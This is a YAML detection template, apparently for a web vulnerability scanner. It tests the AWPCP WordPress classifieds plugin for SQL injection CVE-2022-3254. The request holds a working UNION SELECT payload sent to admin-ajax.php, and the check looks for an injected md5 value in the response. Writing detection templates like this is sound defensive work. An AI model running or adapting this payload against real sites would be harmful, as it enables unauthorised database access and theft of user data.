name: yaml-poc-awpcp-another_wordpress_classifieds_plugin-sql_injection-CVE-2022-3254
binding: d4499772-086d-47de-b880-4182ea1d9447
detail:
    author: jiapeng.han
    links:
        - https://wpscan.com/vulnerability/546c47c2-5b4b-46db-b754-c6b43aef2660
    vulnerability:
        id: 50b3ea1f-01aa-4219-acfd-e7715e1d0358
        level: critical
    warning: Harmless
transport: http
set:
    num: randomInt(100000, 999999)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=awpcp-get-regions-options&parent_type=country&context=search&parent=Algeria&type=user_login`+FROM+wp_users+UNION+ALL+SELECT+md5({{num}})+FROM+wp_users;--+-
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(substr(md5(string(num)), 2, 28))
expression: r0()
